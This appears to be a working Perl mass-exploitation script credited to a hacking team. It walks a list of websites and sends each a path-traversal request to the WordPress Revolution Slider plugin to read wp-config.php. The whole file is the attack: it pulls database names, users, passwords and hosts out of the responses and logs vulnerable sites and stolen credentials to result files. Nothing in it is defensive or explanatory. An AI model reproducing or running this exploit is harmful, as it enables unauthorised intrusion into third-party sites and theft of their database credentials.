#!/usr/bin/perl

use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;

####################### TERMINAL ############################################
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
####################### TITLE TERMINAL ###########################################
system("title [MASS REVSLIDER GET CONFIG] [ SANSORIUGAN ]");
####################### TITLE ####################################################
my $script = '[ MASS REVSLIDER GET CONFIG ]';
my $author = 'SanSORiugan';
my $team = 'CH40$ PH4NT30N';
my $update = '10/08/2018';
my $greetz = 'All friends - INDONESIAN FIGHTER CYBER';
####################### MASUKAN LIST TARGEET##########################################
$res="Result";
    if (-e $res) 
    {
    }
    else
    {
        mkdir $res or die " TIDAK DAPAT MEMBUAT DIREKTORI: $res";
    }
################# INICIO  #############

print "\n";
print colored("         --=[ $script",'BOLD WHITE'),"\n";
print colored("         +---**---==[ Author: $author  ",'BOLD WHITE'),"\n";
print colored("         +---**---==[ Update Date : $update ",'BOLD RED'),"\n";
print colored("         +---**---==[ Team: $team  ",'BOLD WHITE'),"\n";
print colored("         +---**---==[ Agradecimentos: $greetz  ",'BOLD RED'),"\n";
 
 
print colored("+------------------------------------------------------------------------+",'BOLD WHITE'),"\n";
print colored("+------------------------------------------------------------------------+",'BOLD WHITE'),"\n";

########## PART WORK #################
print "[MASUK DAFTAR]: ";
chomp(my $lista=<STDIN>);
open (my $lista,'<',$lista) || die "\n [Tidak ada daftar yang dipilih]";
my @lista = <$lista>;

foreach $site(@lista) {

if($site !~ /http:\/\//) { $site = "http://$site/"; };
getconfig ();
}
sub getconfig{
################################# CHECANDO SE VULN ########################
print colored ("\n[TESTANDO] $site",'BOLD BLUE'),"\n";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);

$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;

################################## GET INFO #################################
if($conttt =~ m/DB_NAME/g){
print colored ("[VULN]",'BOLD GREEN'),"\n";
    open(save, '>>Result/vulntargets.txt');   
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
print colored ("[GET INFO]",'BOLD GREEN'),"\n";
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print color("BOLD RED"),"[-]Database Name = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print color("BOLD BOLD WHITE"),"[-]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print color("BOLD RED"),"[-]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print color("BOLD WHITE"),"[-]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }

}
############################### NÃO VULN #############################
}else{
print colored ("[tidak VULN]",'BOLD RED'),"\n";


}

}